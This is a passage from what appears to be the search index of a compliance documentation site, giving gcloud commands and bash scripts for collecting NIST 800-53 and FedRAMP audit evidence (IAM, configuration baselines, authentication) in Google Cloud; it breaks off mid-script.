<p>Manage user access, permissions, and authentication mechanisms in GCP environments</p> <p> GCP Access Control Testing</p> </li> <li> <p> Configuration Management (CM)</p> <p>Assess baseline configurations, change control, and security settings in GCP</p> <p> GCP Configuration Management</p> </li> <li> <p> Identification &amp; Authentication (IA)</p> <p>Verify identity management, multi-factor authentication, and credential policies</p> <p> GCP Identity &amp; Authentication</p> </li> <li> <p> System &amp; Communications Protection (SC)</p> <p>Test network security, encryption, and data protection controls in GCP</p> <p> GCP Communications Protection</p> </li> <li> <p> System &amp; Information Integrity (SI)</p> <p>Validate monitoring, vulnerability management, and integrity controls</p> <p> GCP System Integrity</p> </li> </ul>"},{"location":"nist-fedramp/#google-workspace","title":"Google Workspace","text":"<ul> <li> <p> Coming Soon: Workspace Controls</p> <p>Comprehensive testing guides for NIST/FedRAMP controls in Google Workspace environments</p> <p> View Roadmap</p> </li> </ul>"},{"location":"nist-fedramp/#key-features","title":"Key Features","text":""},{"location":"nist-fedramp/#control-specific-checklists","title":"\ud83c\udfaf Control-Specific Checklists","text":"<ul> <li>Step-by-step verification procedures</li> <li>Required evidence documentation</li> <li>Common implementation patterns</li> </ul>"},{"location":"nist-fedramp/#technical-implementation","title":"\ud83d\udee0\ufe0f Technical Implementation","text":"<ul> <li>gcloud CLI commands for evidence collection</li> <li>API queries for automated testing</li> <li>Security Command Center integration</li> </ul>"},{"location":"nist-fedramp/#assessment-tools","title":"\ud83d\udcca Assessment Tools","text":"<ul> <li>Pre-configured compliance reports</li> <li>Evidence collection templates</li> <li>Finding documentation formats</li> </ul>"},{"location":"nist-fedramp/#automation-options","title":"\ud83d\udd04 Automation Options","text":"<ul> <li>Policy-as-Code examples</li> <li>Continuous compliance monitoring</li> <li>Integration with GCP native tools</li> </ul>"},{"location":"nist-fedramp/#getting-started","title":"Getting Started","text":"<ol> <li>Identify Your Baseline: Determine which FedRAMP baseline (Low, Moderate, High) or NIST framework applies</li> <li>Review Control Families: Navigate to relevant control family guides</li> <li>Execute Testing: Follow the checklists and use provided commands</li> <li>Document Findings: Use templates to record evidence and observations</li> <li>Remediate Issues: Address any identified gaps or deficiencies</li> </ol>"},{"location":"nist-fedramp/#best-practices","title":"Best Practices","text":"<p>Assessment Preparation</p> <ul> <li>Review the System Security Plan (SSP) before testing</li> <li>Ensure proper access permissions for evidence collection</li> <li>Coordinate with system owners for testing windows</li> <li>Document all assumptions and limitations</li> </ul> <p>Common Pitfalls</p> <ul> <li>Testing in production without approval</li> <li>Incomplete evidence collection</li> <li>Missing control inheritance documentation</li> <li>Overlooking compensating controls</li> </ul>"},{"location":"nist-fedramp/#resources","title":"Resources","text":"<ul> <li>NIST SP 800-53 Rev 5</li> <li>FedRAMP Control Baselines</li> <li>Google Cloud Security Best Practices</li> <li>Google Workspace Security Center</li> </ul>"},{"location":"nist-fedramp/#roadmap","title":"Roadmap","text":""},{"location":"nist-fedramp/#current-release","title":"Current Release","text":"<ul> <li>\u2705 GCP Access Control (AC) Testing Guide</li> <li>\u2705 GCP Configuration Management (CM) Testing Guide</li> <li>\u2705 GCP Identification &amp; Authentication (IA) Testing Guide</li> <li>\u2705 GCP System &amp; Communications Protection (SC) Testing Guide</li> <li>\u2705 GCP System &amp; Information Integrity (SI) Testing Guide</li> </ul>"},{"location":"nist-fedramp/#upcoming-releases","title":"Upcoming Releases","text":"<ul> <li>\ud83d\udea7 Google Workspace Access Control Testing Guide</li> <li>\ud83d\udea7 Google Workspace Data Protection Guide</li> <li>\ud83d\udea7 Automated Compliance Scanning Tools</li> <li>\ud83d\udea7 Integration with Security Command Center</li> <li>\ud83d\udea7 Continuous Compliance Monitoring Playbooks</li> </ul>"},{"location":"nist-fedramp/#contributing","title":"Contributing","text":"<p>We welcome contributions to improve and expand these testing guides. Please see our Contributing Guidelines for more information.</p>"},{"location":"nist-fedramp/#support","title":"Support","text":"<p>For questions or support regarding these testing guides: - Create an issue in our GitHub repository - Contact the security team at security@yourorganization.com</p>"},{"location":"nist-fedramp/gcp/access-control/","title":"Access Control (AC) - Google Cloud Platform","text":""},{"location":"nist-fedramp/gcp/access-control/#overview","title":"Overview","text":"<p>This guide provides gcloud commands and automated methods for collecting evidence related to NIST SP 800-53 and FedRAMP Access Control (AC) family controls in Google Cloud Platform environments.</p>"},{"location":"nist-fedramp/gcp/access-control/#key-gcp-services","title":"Key GCP Services","text":"<ul> <li>Cloud IAM: Role-based access control and identity management</li> <li>Cloud Identity: Enterprise identity services and directory</li> <li>Organization Policies: Centralized control constraints</li> <li>VPC Service Controls: Perimeter-based access controls</li> <li>Cloud Audit Logs: Access monitoring and logging</li> </ul>"},{"location":"nist-fedramp/gcp/access-control/#control-implementation-commands","title":"Control Implementation Commands","text":""},{"location":"nist-fedramp/gcp/access-control/#ac-2-account-management","title":"AC-2: Account Management","text":"<p>List all IAM policy bindings for a project <pre><code>gcloud projects get-iam-policy PROJECT_ID --format=json\n</code></pre></p> <p>List all service accounts in a project <pre><code>gcloud iam service-accounts list --project=PROJECT_ID\n</code></pre></p> <p>Get IAM policy for an organization <pre><code>gcloud organizations get-iam-policy ORGANIZATION_ID\n</code></pre></p> <p>List custom roles in organization <pre><code>gcloud iam roles list --organization=ORGANIZATION_ID --show-deleted\n</code></pre></p> <p>Export audit logs for account activities <pre><code>gcloud logging read \"protoPayload.methodName:(\\\"SetIamPolicy\\\" OR \\\"CreateServiceAccount\\\" OR \\\"DeleteServiceAccount\\\")\" \\\n  --project=PROJECT_ID \\\n  --format=json \\\n  --freshness=30d\n</code></pre></p> <p>List all members with specific roles <pre><code>gcloud asset search-all-iam-policies \\\n  --scope=organizations/ORGANIZATION_ID \\\n  --query=\"policy:roles/owner\"\n</code></pre></p>"},{"location":"nist-fedramp/gcp/access-control/#ac-3-access-enforcement","title":"AC-3: Access Enforcement","text":"<p>Check effective permissions for a user <pre><code>gcloud projects get-iam-policy PROJECT_ID \\\n  --flatten=\"bindings[].members\" \\\n  --filter=\"bindings.members:user:EMAIL_ADDRESS\" \\\n  --format=\"table(bindings.role)\"\n</code></pre></p> <p>List organizational policies <pre><code>gcloud resource-manager org-policies list --organization=ORGANIZATION_ID\n</code></pre></p> <p>Verify VPC Service Controls <pre><code>gcloud access-context-manager perimeters list\n</code></pre></p> <p>Get specific organizational policy details <pre><code>gcloud resource-manager org-policies describe CONSTRAINT_NAME \\\n  --organization=ORGANIZATION_ID\n</code></pre></p>"},{"location":"nist-fedramp/gcp/access-control/#ac-4-information-flow-enforcement","title":"AC-4: Information Flow Enforcement","text":"<p>List VPC firewall rules <pre><code>gcloud compute firewall-rules list --project=PROJECT_ID\n</code></pre></p> <p>Show VPC Service Control perimeters <pre><code>gcloud access-context-manager perimeters describe PERIMETER_NAME\n</code></pre></p> <p>List Cloud Armor security policies <pre><code>gcloud compute security-policies list --project=PROJECT_ID\n</code></pre></p> <p>Get details of specific firewall rules <pre><code>gcloud compute firewall-rules describe RULE_NAME --project=PROJECT_ID\n</code></pre></p>"},{"location":"nist-fedramp/gcp/access-control/#ac-5-separation-of-duties","title":"AC-5: Separation of Duties","text":"<p>Create custom role with specific permissions <pre><code>gcloud iam roles create ROLE_ID \\\n  --organization=ORGANIZATION_ID \\\n  --title=\"Custom Role Title\" \\\n  --description=\"Role description\" \\\n  --permissions=permission1,permission2\n</code></pre></p> <p>Audit users with multiple privileged roles <pre><code>gcloud asset search-all-iam-policies \\\n  --scope=organizations/ORGANIZATION_ID \\\n  --query=\"policy:roles/owner OR policy:roles/editor\"\n</code></pre></p> <p>List all custom roles <pre><code>gcloud iam roles list --organization=ORGANIZATION_ID --format=\"table(name,title,description)\"\n</code></pre></p>"},{"location":"nist-fedramp/gcp/access-control/#ac-6-least-privilege","title":"AC-6: Least Privilege","text":"<p>Find all primitive role assignments <pre><code>gcloud asset search-all-iam-policies \\\n  --scope=organizations/ORGANIZATION_ID \\\n  --query=\"policy:(roles/owner OR roles/editor OR roles/viewer)\"\n</code></pre></p> <p>List permissions for a specific role <pre><code>gcloud iam roles describe roles/compute.admin\n</code></pre></p> <p>Check for overly permissive service account keys <pre><code>gcloud iam service-accounts keys list \\\n  --iam-account=SERVICE_ACCOUNT_EMAIL \\\n  --managed-by=user \\\n  --format=\"table(name,validAfterTime,validBeforeTime)\"\n</code></pre></p>"},{"location":"nist-fedramp/gcp/access-control/#ac-7-unsuccessful-logon-attempts","title":"AC-7: Unsuccessful Logon Attempts","text":"<p>Query failed login attempts from audit logs <pre><code>gcloud logging read \"protoPayload.authenticationInfo.principalEmail:* AND severity=ERROR AND protoPayload.status.code=7\" \\\n  --project=PROJECT_ID \\\n  --format=json \\\n  --freshness=7d\n</code></pre></p> <p>Monitor authentication events <pre><code>gcloud logging read \"protoPayload.serviceName=\\\"cloudresourcemanager.googleapis.com\\\" AND protoPayload.authenticationInfo.principalEmail:*\" \\\n  --project=PROJECT_ID \\\n  --limit=100\n</code></pre></p>"},{"location":"nist-fedramp/gcp/access-control/#ac-17-remote-access","title":"AC-17: Remote Access","text":"<p>List all Compute Engine instances with external IPs <pre><code>gcloud compute instances list \\\n  --format=\"table(name,networkInterfaces[0].accessConfigs[0].natIP:label=EXTERNAL_IP)\" \\\n  --filter=\"networkInterfaces[0].accessConfigs[0].natIP:*\"\n</code></pre></p> <p>Check IAP (Identity-Aware Proxy) tunnel instances <pre><code>gcloud compute instances list \\\n  --filter=\"labels.use-iap-tunnel=true\" \\\n  --format=\"table(name,status,labels)\"\n</code></pre></p> <p>List Cloud VPN tunnels <pre><code>gcloud compute vpn-tunnels list --project=PROJECT_ID\n</code></pre></p>"},{"location":"nist-fedramp/gcp/access-control/#ac-20-use-of-external-information-systems","title":"AC-20: Use of External Information Systems","text":"<p>List all external IP addresses <pre><code>gcloud compute addresses list --project=PROJECT_ID --filter=\"addressType=EXTERNAL\"\n</code></pre></p> <p>Check Private Google Access status <pre><code>gcloud compute networks subnets list \\\n  --project=PROJECT_ID \\\n  --format=\"table(name,privateIpGoogleAccess,region)\"\n</code></pre></p>"},{"location":"nist-fedramp/gcp/access-control/#automated-evidence-collection-scripts","title":"Automated Evidence Collection Scripts","text":""},{"location":"nist-fedramp/gcp/access-control/#export-complete-iam-configuration","title":"Export Complete IAM Configuration","text":"<pre><code>#!/bin/bash\n# Export complete IAM configuration for compliance audit\n\nORG_ID=\"YOUR_ORG_ID\"\nOUTPUT_DIR=\"iam_audit_$(date +%Y%m%d)\"\nmkdir -p $OUTPUT_DIR\n\n# Organization level IAM\ngcloud organizations get-iam-policy $ORG_ID --format=json &gt; $OUTPUT_DIR/org_iam_policy.json\n\n# All folders\ngcloud resource-manager folders list --organization=$ORG_ID --format=json &gt; $OUTPUT_DIR/folders.json\n\n# All projects\ngcloud projects list --format=json &gt; $OUTPUT_DIR/projects.json\n\n# Service accounts across all projects\nfor project in $(gcloud projects list --format=\"value(projectId)\"); do\n    echo \"Processing project: $project\"\n    gcloud iam service-accounts list --project=$project --format=json &gt; $OUTPUT_DIR/service_accounts_$project.json\n    gcloud projects get-iam-policy $project --format=json &gt; $OUTPUT_DIR/project_iam_$project.json\ndone\n</code></pre>"},{"location":"nist-fedramp/gcp/access-control/#monitor-privileged-access-changes","title":"Monitor Privileged Access Changes","text":"<pre><code>#!/bin/bash\n# Monitor changes to privileged roles\n\ngcloud logging read '\nprotoPayload.methodName=\"SetIamPolicy\" AND\n(protoPayload.request.policy.bindings.role=\"roles/owner\" OR\n protoPayload.request.policy.bindings.role=\"roles/editor\" OR\n protoPayload.request.policy.bindings.role=\"roles/iam.securityAdmin\")' \\\n--project=PROJECT_ID \\\n--format=json \\\n--freshness=24h\n</code></pre>"},{"location":"nist-fedramp/gcp/access-control/#check-compliance-status","title":"Check Compliance Status","text":"<pre><code>#!/bin/bash\n# Quick compliance check for common access control issues\n\necho \"=== Checking for primitive roles usage ===\"\ngcloud asset search-all-iam-policies \\\n  --scope=organizations/$ORG_ID \\\n  --query=\"policy:(roles/owner OR roles/editor)\" \\\n  --format=\"table(resource,policy.bindings.role,policy.bindings.members)\"\n\necho \"=== Checking for service accounts with user-managed keys ===\"\nfor sa in $(gcloud iam service-accounts list --format=\"value(email)\"); do\n    keys=$(gcloud iam service-accounts keys list --iam-account=$sa --managed-by=user --format=\"value(name)\")\n    if [ ! -z \"$keys\" ]; then\n        echo \"Service Account: $sa has user-managed keys\"\n    fi\ndone\n\necho \"=== Checking for external IP addresses ===\"\ngcloud compute instances list \\\n  --format=\"table(name,networkInterfaces[0].accessConfigs[0].natIP)\" \\\n  --filter=\"networkInterfaces[0].accessConfigs[0].natIP:*\"\n</code></pre>"},{"location":"nist-fedramp/gcp/access-control/#additional-resources","title":"Additional Resources","text":"<ul> <li>Google Cloud IAM Documentation</li> <li>gcloud CLI Reference</li> <li>Cloud Asset Inventory</li> </ul>"},{"location":"nist-fedramp/gcp/configuration-management/","title":"Configuration Management (CM) - Google Cloud Platform","text":""},{"location":"nist-fedramp/gcp/configuration-management/#overview","title":"Overview","text":"<p>This guide provides gcloud commands and automated methods for collecting evidence related to NIST SP 800-53 and FedRAMP Configuration Management (CM) family controls in Google Cloud Platform environments.</p>"},{"location":"nist-fedramp/gcp/configuration-management/#key-gcp-services","title":"Key GCP Services","text":"<ul> <li>Cloud Asset Inventory: Track and analyze resource configurations</li> <li>Organization Policy Service: Enforce configuration constraints</li> <li>Deployment Manager: Infrastructure as code templates</li> <li>Security Command Center: Configuration compliance monitoring</li> <li>Cloud Build: Automated deployment pipelines</li> </ul>"},{"location":"nist-fedramp/gcp/configuration-management/#control-implementation-commands","title":"Control Implementation Commands","text":""},{"location":"nist-fedramp/gcp/configuration-management/#cm-2-baseline-configuration","title":"CM-2: Baseline Configuration","text":"<p>Export current project configuration <pre><code>gcloud asset export \\\n  --project=PROJECT_ID \\\n  --output-path=gs://BUCKET_NAME/baseline-config.json \\\n  --content-type=resource\n</code></pre></p> <p>List all Compute Engine instance templates <pre><code>gcloud compute instance-templates list --project=PROJECT_ID\n</code></pre></p> <p>Export organization policies <pre><code>gcloud resource-manager org-policies list \\\n  --organization=ORGANIZATION_ID \\\n  --format=json &gt; org-policies-baseline.json\n</code></pre></p> <p>Capture VPC configurations <pre><code>gcloud compute networks list --project=PROJECT_ID --format=json\ngcloud compute firewall-rules list --project=PROJECT_ID --format=json\n</code></pre></p> <p>List all images in project <pre><code>gcloud compute images list --project=PROJECT_ID\n</code></pre></p> <p>Export Deployment Manager deployments <pre><code>gcloud deployment-manager deployments list --project=PROJECT_ID\ngcloud deployment-manager deployments describe DEPLOYMENT_NAME --project=PROJECT_ID\n</code></pre></p>"},{"location":"nist-fedramp/gcp/configuration-management/#cm-3-configuration-change-control","title":"CM-3: Configuration Change Control","text":"<p>Monitor configuration changes via audit logs <pre><code>gcloud logging read \\\n  \"protoPayload.methodName:(\\\"compute.instances.insert\\\" OR \\\"compute.firewalls.patch\\\" OR \\\"storage.buckets.update\\\")\" \\\n  --project=PROJECT_ID \\\n  --format=json \\\n  --freshness=7d\n</code></pre></p> <p>List Cloud Source Repositories <pre><code>gcloud source repos list --project=PROJECT_ID\n</code></pre></p> <p>View Cloud Build history <pre><code>gcloud builds list --project=PROJECT_ID --limit=50\n</code></pre></p> <p>Check deployment history <pre><code>gcloud deployment-manager deployments list --project=PROJECT_ID --format=\"table(name,insertTime,operation.status)\"\n</code></pre></p>"},{"location":"nist-fedramp/gcp/configuration-management/#cm-5-access-restrictions-for-change","title":"CM-5: Access Restrictions for Change","text":"<p>Create custom role for configuration management <pre><code>gcloud iam roles create configurationManager \\\n  --organization=ORGANIZATION_ID \\\n  --title=\"Configuration Manager\" \\\n  --description=\"Manages infrastructure configurations\" \\\n  --permissions=compute.instances.update,compute.networks.update,storage.buckets.update\n</code></pre></p> <p>List who has deployment permissions <pre><code>gcloud projects get-iam-policy PROJECT_ID \\\n  --flatten=\"bindings[].members\" \\\n  --filter=\"bindings.role:(roles/deploymentmanager.editor OR roles/editor OR roles/owner)\" \\\n  --format=\"table(bindings.members,bindings.role)\"\n</code></pre></p>"},{"location":"nist-fedramp/gcp/configuration-management/#cm-6-configuration-settings","title":"CM-6: Configuration Settings","text":"<p>List Security Health Analytics findings <pre><code>gcloud scc findings list organizations/ORGANIZATION_ID \\\n  --source=organizations/ORGANIZATION_ID/sources/SECURITY_HEALTH_ANALYTICS_SOURCE_ID \\\n  --filter=\"state=\\\"ACTIVE\\\"\"\n</code></pre></p> <p>Check Cloud Storage bucket configurations <pre><code>for bucket in $(gsutil ls); do\n  echo \"Bucket: $bucket\"\n  gsutil iam get $bucket\n  gsutil uniformbucketlevelaccess get $bucket\ndone\n</code></pre></p> <p>Verify OS Login is enabled on instances <pre><code>gcloud compute instances list \\\n  --format=\"table(name,metadata.items[key='enable-oslogin'].value)\" \\\n  --filter=\"metadata.items.key='enable-oslogin'\"\n</code></pre></p> <p>Check project-wide metadata <pre><code>gcloud compute project-info describe --project=PROJECT_ID --format=\"yaml(commonInstanceMetadata)\"\n</code></pre></p>"},{"location":"nist-fedramp/gcp/configuration-management/#cm-7-least-functionality","title":"CM-7: Least Functionality","text":"<p>List enabled APIs <pre><code>gcloud services list --enabled --project=PROJECT_ID\n</code></pre></p> <p>Disable unnecessary APIs <pre><code>gcloud services disable API_NAME --project=PROJECT_ID\n</code></pre></p> <p>Find unused firewall rules <pre><code>gcloud compute firewall-rules list \\\n  --filter=\"disabled=true\" \\\n  --format=\"table(name,creationTimestamp,disabled)\"\n</code></pre></p> <p>List all running services on instances <pre><code>gcloud compute ssh INSTANCE_NAME --command=\"systemctl list-units --type=service --state=running\"\n</code></pre></p>"},{"location":"nist-fedramp/gcp/configuration-management/#cm-8-information-system-component-inventory","title":"CM-8: Information System Component Inventory","text":"<p>Export complete asset inventory <pre><code>gcloud asset export \\\n  --organization=ORGANIZATION_ID \\\n  --output-path=gs://BUCKET_NAME/inventory-$(date +%Y%m%d).json \\\n  --content-type=resource\n</code></pre></p> <p>Query specific resource types <pre><code>gcloud asset search-all-resources \\\n  --scope=organizations/ORGANIZATION_ID \\\n  --asset-types=compute.googleapis.com/Instance,storage.googleapis.com/Bucket\n</code></pre></p> <p>List resources with specific labels <pre><code>gcloud compute instances list \\\n  --filter=\"labels.environment=production\" \\\n  --format=\"table(name,labels.environment,labels.owner,creationTimestamp)\"\n</code></pre></p> <p>Export all Compute Engine resources <pre><code># Instances\ngcloud compute instances list --format=json &gt; instances.json\n\n# Disks\ngcloud compute disks list --format=json &gt; disks.json\n\n# Networks\ngcloud compute networks list --format=json &gt; networks.json\n\n# Subnets\ngcloud compute networks subnets list --format=json &gt; subnets.json\n</code></pre></p>"},{"location":"nist-fedramp/gcp/configuration-management/#cm-9-configuration-management-plan","title":"CM-9: Configuration Management Plan","text":"<p>Check organization constraints <pre><code>gcloud resource-manager org-policies list --organization=ORGANIZATION_ID\n</code></pre></p> <p>View specific constraint details <pre><code>gcloud resource-manager org-policies describe constraints/compute.requireOsLogin \\\n  --organization=ORGANIZATION_ID\n</code></pre></p>"},{"location":"nist-fedramp/gcp/configuration-management/#automated-evidence-collection-scripts","title":"Automated Evidence Collection Scripts","text":""},{"location":"nist-fedramp/gcp/configuration-management/#complete-configuration-baseline-export","title":"Complete Configuration Baseline Export","text":"<pre><code>#!/bin/bash\n# Export complete configuration baseline\n\nPROJECT_ID=\"YOUR_PROJECT_ID\"\nORG_ID=\"YOUR_ORG_ID\"\nOUTPUT_DIR=\"config_baseline_$(date +%Y%m%d)\"\nmkdir -p $OUTPUT_DIR\n\n# Organization policies\ngcloud resource-manager org-policies list --organization=$ORG_ID --format=json &gt; $OUTPUT_DIR/org_policies.json\n\n# Asset inventory\ngcloud asset export \\\n  --organization=$ORG_ID \\\n  --output-path=gs://YOUR_BUCKET/$OUTPUT_DIR/full_inventory.json \\\n  --content-type=resource\n\n# Compute configurations\ngcloud compute instances list --format=json &gt; $OUTPUT_DIR/instances.json\ngcloud compute firewall-rules list --format=json &gt; $OUTPUT_DIR/firewall_rules.json\ngcloud compute networks list --format=json &gt; $OUTPUT_DIR/networks.json\ngcloud compute instance-templates list --format=json &gt; $OUTPUT_DIR/instance_templates.json\n\n# Storage configurations\ngsutil ls -L &gt; $OUTPUT_DIR/storage_buckets.txt\n\n# Enabled APIs\ngcloud services list --enabled --format=json &gt; $OUTPUT_DIR/enabled_apis.json\n</code></pre>"},{"location":"nist-fedramp/gcp/configuration-management/#configuration-drift-detection","title":"Configuration Drift Detection","text":"<pre><code>#!/bin/bash\n# Detect configuration changes from baseline\n\nBASELINE_DIR=\"baseline_configs\"\nCURRENT_DIR=\"current_configs_$(date +%Y%m%d)\"\nmkdir -p $CURRENT_DIR\n\n# Export current configurations\ngcloud compute firewall-rules list --format=json &gt; $CURRENT_DIR/firewall_rules.json\ngcloud compute instances list --format=json &gt; $CURRENT_DIR/instances.json\n\n# Compare with baseline\necho \"=== Firewall Rules Changes ===\"\ndiff $BASELINE_DIR/firewall_rules.json $CURRENT_DIR/firewall_rules.json\n\necho \"=== Instance Changes ===\"\ndiff $BASELINE_DIR/instances.json $CURRENT_DIR/instances.json\n</code></pre>"},{"location":"nist-fedramp/gcp/configuration-management/#monitor-configuration-changes","title":"Monitor Configuration Changes","text":"<pre><code>#!/bin/bash\n# Monitor critical configuration changes in last 24 hours\n\ngcloud logging read '\n(protoPayload.methodName=\"compute.firewalls.insert\" OR\n protoPayload.methodName=\"compute.firewalls.patch\" OR\n protoPayload.methodName=\"compute.firewalls.delete\" OR\n protoPayload.methodName=\"storage.buckets.update\" OR\n protoPayload.methodName=\"compute.instances.setMetadata\")' \\\n--project=PROJECT_ID \\\n--format=\"table(timestamp,protoPayload.authenticationInfo.principalEmail,protoPayload.methodName,protoPayload.resourceName)\" \\\n--freshness=24h\n</code></pre>"},{"location":"nist-fedramp/gcp/configuration-management/#additional-resources","title":"Additional Resources","text":"<ul> <li>Google Cloud Asset Inventory</li> <li>Organization Policy Service</li> <li>gcloud CLI Reference</li> </ul>"},{"location":"nist-fedramp/gcp/identification-authentication/","title":"Identification and Authentication (IA) - Google Cloud Platform","text":""},{"location":"nist-fedramp/gcp/identification-authentication/#overview","title":"Overview","text":"<p>This guide provides gcloud commands and automated methods for collecting evidence related to NIST SP 800-53 and FedRAMP Identification and Authentication (IA) family controls in Google Cloud Platform environments.</p>"},{"location":"nist-fedramp/gcp/identification-authentication/#key-gcp-services","title":"Key GCP Services","text":"<ul> <li>Cloud Identity: Identity management and authentication</li> <li>Cloud IAM: Identity and Access Management</li> <li>Cloud KMS: Key management for authentication</li> <li>Security Command Center: Security monitoring</li> <li>Cloud Audit Logs: Authentication event logging</li> </ul>"},{"location":"nist-fedramp/gcp/identification-authentication/#control-implementation-commands","title":"Control Implementation Commands","text":""},{"location":"nist-fedramp/gcp/identification-authentication/#ia-2-identification-and-authentication-organizational-users","title":"IA-2: Identification and Authentication (Organizational Users)","text":"<p>List all users in organization <pre><code>gcloud identity groups memberships list \\\n  --group-email=\"all@YOUR_DOMAIN.com\" \\\n  --format=\"table(preferredMemberKey.id)\"\n</code></pre></p> <p>Check for users without 2FA enabled (via audit logs) <pre><code>gcloud logging read \\\n  \"protoPayload.authenticationInfo.principalEmail:* AND NOT labels.\\\"2fa_used\\\":true\" \\\n  --project=PROJECT_ID \\\n  --freshness=7d\n</code></pre></p> <p>List service accounts and their keys <pre><code># List all service accounts\ngcloud iam service-accounts list --project=PROJECT_ID\n\n# For each service account, list keys\ngcloud iam service-accounts keys list \\\n  --iam-account=SERVICE_ACCOUNT_EMAIL \\\n  --format=\"table(name,validAfterTime,validBeforeTime,keyType)\"\n</code></pre></p>"},{"location":"nist-fedramp/gcp/identification-authentication/#ia-3-device-identification-and-authentication","title":"IA-3: Device Identification and Authentication","text":"<p>List all Compute Engine instances with OS Login enabled <pre><code>gcloud compute instances list \\\n  --format=\"table(name,metadata.items[key='enable-oslogin'].value)\" \\\n  --project=PROJECT_ID\n</code></pre></p> <p>Check metadata for SSH key management <pre><code>gcloud compute project-info describe \\\n  --format=\"value(commonInstanceMetadata.items[key='ssh-keys'])\" \\\n  --project=PROJECT_ID\n</code></pre></p> <p>List instances blocking project-wide SSH keys <pre><code>gcloud compute instances list \\\n  --filter=\"metadata.items[key='block-project-ssh-keys'].value='TRUE'\" \\\n  --format=\"table(name,zone)\"\n</code></pre></p>"},{"location":"nist-fedramp/gcp/identification-authentication/#ia-4-identifier-management","title":"IA-4: Identifier Management","text":"<p>List all service accounts with naming patterns <pre><code>gcloud iam service-accounts list \\\n  --format=\"table(email,displayName,disabled)\" \\\n  --project=PROJECT_ID\n</code></pre></p> <p>Check for duplicate or similar account names <pre><code>gcloud iam service-accounts list --format=\"value(email)\" | sort | uniq -d\n</code></pre></p> <p>Audit service account creation <pre><code>gcloud logging read \\\n  \"protoPayload.methodName=\\\"google.iam.admin.v1.CreateServiceAccount\\\"\" \\\n  --project=PROJECT_ID \\\n  --format=json \\\n  --freshness=30d\n</code></pre></p>"},{"location":"nist-fedramp/gcp/identification-authentication/#ia-5-authenticator-management","title":"IA-5: Authenticator Management","text":"<p>Check service account key age <pre><code>for sa in $(gcloud iam service-accounts list --format=\"value(email)\" --project=PROJECT_ID); do\n  echo \"Service Account: $sa\"\n  gcloud iam service-accounts keys list \\\n    --iam-account=$sa \\\n    --format=\"table(name,validAfterTime,validBeforeTime)\" \\\n    --filter=\"keyType=USER_MANAGED\"\ndone\n</code></pre></p> <p>Find service accounts with multiple active keys <pre><code>for sa in $(gcloud iam service-accounts list --format=\"value(email)\" --project=PROJECT_ID); do\n  key_count=$(gcloud iam service-accounts keys list --iam-account=$sa --format=\"value(name)\" | wc -l)\n  if [ $key_count -gt 2 ]; then\n    echo \"$sa has $key_count keys\"\n  fi\ndone\n</code></pre></p> <p>Monitor key creation/deletion activities <pre><code>gcloud logging read \\\n  \"protoPayload.methodName:(\\\"google.iam.admin.v1.CreateServiceAccountKey\\\" OR \\\"google.iam.admin.v1.DeleteServiceAccountKey\\\")\" \\\n  --project=PROJECT_ID \\\n  --format=\"table(timestamp,protoPayload.authenticationInfo.principalEmail,protoPayload.methodName,resource.labels.email)\"\n</code></pre></p>"},{"location":"nist-fedramp/gcp/identification-authentication/#ia-8-identification-and-authentication-non-organizational-users","title":"IA-8: Identification and Authentication (Non-Organizational Users)","text":"<p>List all IAM bindings with external users <pre><code>gcloud projects get-iam-policy PROJECT_ID \\\n  --flatten=\"bindings[].members\" \\\n  --filter=\"bindings.members:user:* AND NOT bindings.members:*@YOUR_DOMAIN.com\" \\\n  --format=\"table(bindings.members,bindings.role)\"\n</code></pre></p> <p>Check for allUsers or allAuthenticatedUsers bindings <pre><code>gcloud projects get-iam-policy PROJECT_ID \\\n  --flatten=\"bindings[].members\" \\\n  --filter=\"bindings.members:(allUsers OR allAuthenticatedUsers)\" \\\n  --format=\"table(bindings.members,bindings.role)\"\n</code></pre></p> <p>Audit external access in Cloud Storage <pre><code>for bucket in $(gsutil ls); do\n  echo \"Checking bucket: $bucket\"\n  gsutil iam get $bucket | grep -E \"allUsers|allAuthenticatedUsers\" || echo \"No public access\"\ndone\n</code></pre></p>"},{"location":"nist-fedramp/gcp/identification-authentication/#automated-evidence-collection-scripts","title":"Automated Evidence Collection Scripts","text":""},{"location":"nist-fedramp/gcp/identification-authentication/#complete-authentication-audit","title":"Complete Authentication Audit","text":"<pre><code>#!/bin/bash\n# Comprehensive authentication audit script\n\nPROJECT_ID=\"YOUR_PROJECT_ID\"\nORG_ID=\"YOUR_ORG_ID\"\nOUTPUT_DIR=\"ia_audit_$(date +%Y%m%d)\"\nmkdir -p $OUTPUT_DIR\n\n# Service accounts inventory\necho \"=== Service Account Audit ===\"\ngcloud iam service-accounts list --format=json &gt; $OUTPUT_DIR/service_accounts.json\n\n# Service account keys audit\nfor sa in $(gcloud iam service-accounts list --format=\"value(email)\"); do\n  gcloud iam service-accounts keys list \\\n    --iam-account=$sa \\\n    --format=json &gt; $OUTPUT_DIR/keys_${sa//[@.]/_}.json\ndone\n\n# OS Login status\necho \"=== OS Login Configuration ===\"\ngcloud compute instances list \\\n  --format=\"json(name,metadata.items[key='enable-oslogin'])\" &gt; $OUTPUT_DIR/oslogin_status.json\n\n# External access audit\necho \"=== External Access Audit ===\"\ngcloud projects get-iam-policy $PROJECT_ID \\\n  --flatten=\"bindings[].members\" \\\n  --filter=\"NOT bindings.members:*@YOUR_DOMAIN.com\" \\\n  --format=json &gt; $OUTPUT_DIR/external_access.json\n\n# Authentication logs\necho \"=== Failed Authentication Attempts ===\"\ngcloud logging read \\\n  \"protoPayload.authenticationInfo.principalEmail:* AND severity=ERROR\" \\\n  --project=$PROJECT_ID \\\n  --format=json \\\n  --freshness=7d &gt; $OUTPUT_DIR/failed_auth.json\n</code></pre>"},{"location":"nist-fedramp/gcp/identification-authentication/#monitor-authentication-events","title":"Monitor Authentication Events","text":"<pre><code>#!/bin/bash\n# Real-time authentication monitoring\n\n# Monitor failed authentications\ngcloud logging read \\\n  \"protoPayload.status.code=7 OR protoPayload.status.code=16\" \\\n  --project=PROJECT_ID \\\n  --format=\"table(timestamp,protoPayload.authenticationInfo.principalEmail,protoPayload.status.message)\" \\\n  --freshness=1h\n\n# Monitor service account usage\ngcloud logging read \\\n  \"protoPayload.authenticationInfo.serviceAccountDelegationInfo.firstPartyPrincipal.principalEmail:*\" \\\n  --project=PROJECT_ID \\\n  --format=\"table(timestamp,protoPayload.authenticationInfo.principalEmail,protoPayload.methodName)\" \\\n  --freshness=1h\n</code></pre>"},{"location":"nist-fedramp/gcp/identification-authentication/#service-account-key-rotation-check","title":"Service Account Key Rotation Check","text":"<pre><code>#!/bin/bash\n# Check for service account keys older than 90 